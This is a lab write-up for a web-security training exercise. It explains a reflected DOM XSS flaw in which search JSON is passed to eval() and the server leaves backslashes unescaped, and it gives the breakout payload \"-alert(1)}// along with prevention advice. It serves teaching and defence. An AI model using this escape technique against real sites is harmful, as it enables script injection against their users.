# Lab 09: Reflected DOM XSS

**Goal**: Exploit a reflected DOM-based cross-site scripting vulnerability to execute `alert(1)`.

This lab demonstrates a Reflected DOM XSS vulnerability. Reflected DOM XSS occurs when a server-side application echoes user input from an HTTP request into a response (such as a JSON object), and client-side JavaScript on the page subsequently processes that reflected data in an unsafe way, passing it into a dangerous execution sink like `eval()`.

---

## 🎯 Solution

1. Intercept search requests in Burp Suite Proxy.
2. Search for a test string (e.g., `XSS`).
3. Observe that the server returns a JSON response:
   ```json
   {"searchTerm":"XSS", "results":[]}
   ```
4. Inspect `searchResults.js` to locate the sink:
   ```javascript
   eval('var searchResultsObj = ' + this.responseText);
   ```
5. Notice that quotes (`"`) are escaped by the server, but backslashes (`\`) are not.
6. Escape the JSON string context using a backslash and execute `alert(1)`:
   ```text
   \"-alert(1)}//
   ```

![Lab 9 Burp Repeater Payload](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20131811.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Intercept Search Request
Turn on **Intercept** in Burp Suite Proxy. Submit a search query (e.g., `XSS`) on the lab website.

### Step 2: Analyze HTTP Response
Forward the request in Burp Suite and observe that the application sends an AJAX GET request to `/search-results?search=XSS` which returns JSON data:

```json
{"searchTerm":"XSS", "results":[]}
```

### Step 3: Analyze Client-Side Source and Sink
Open `searchResults.js` in Developer Tools or Burp Suite Site Map. Locate the function processing the AJAX response:

```javascript
function searchResults() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", "/search-results?search=" + encodeURIComponent(search), true);
    xhr.send();
}
```

- **Source**: Server response (`this.responseText`) containing user search query.
- **Sink**: `eval()` function evaluating raw string concatenation.

### Step 4: Test Escaping Mechanics
If we input `"`, the server returns `\"` inside the JSON object, escaping the double quote:
```javascript
eval('var searchResultsObj = {"searchTerm":"\""}');
```

However, the server does **NOT** escape backslash `\` characters! If we input `\"`, the server reflects `\"` as `\\"`:
```javascript
eval('var searchResultsObj = {"searchTerm":"\\""}');
```
The first backslash escapes the second backslash, leaving the double quote unescaped!

### Step 5: Craft Payload
We can close the JSON object and inject arbitrary JavaScript using:
```text
\"-alert(1)}//
```

When evaluated by `eval()`, the string expands to:
```javascript
var searchResultsObj = {"searchTerm":"\"-alert(1)}//"}
```
Which evaluates as:
1. `var searchResultsObj = {"searchTerm":""`
2. `- alert(1)` (Executes JavaScript code!)
3. `}` (Closes object definition)
4. `//` (Comments out remaining JSON trailing syntax)

### Step 6: Execute Exploitation
Submit `\"-alert(1)}//` into the search box. The `eval()` sink executes the payload and triggers `alert(1)`.

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(1)` via Reflected DOM XSS in `eval()`!

---

## 💡 Key Takeaways: Reflected DOM XSS

- **Two-Stage Vulnerability**: Data is reflected from the server (stage 1) and then processed by client-side JavaScript into a DOM sink (stage 2).
- **Unsafe Evaluation**: Using `eval()` to parse JSON responses (`eval('var obj = ' + json)`) is inherently unsafe. Use `JSON.parse()` instead.

---

## 🔒 Prevention

> [!TIP]
> 1. **Use `JSON.parse()`**: Always use native `JSON.parse(this.responseText)` to parse JSON data safely without executing JavaScript code.
> 2. **Escape Backslashes**: If echoing user input into JSON strings, ensure backslashes `\` and quotes `"` are both properly escaped.
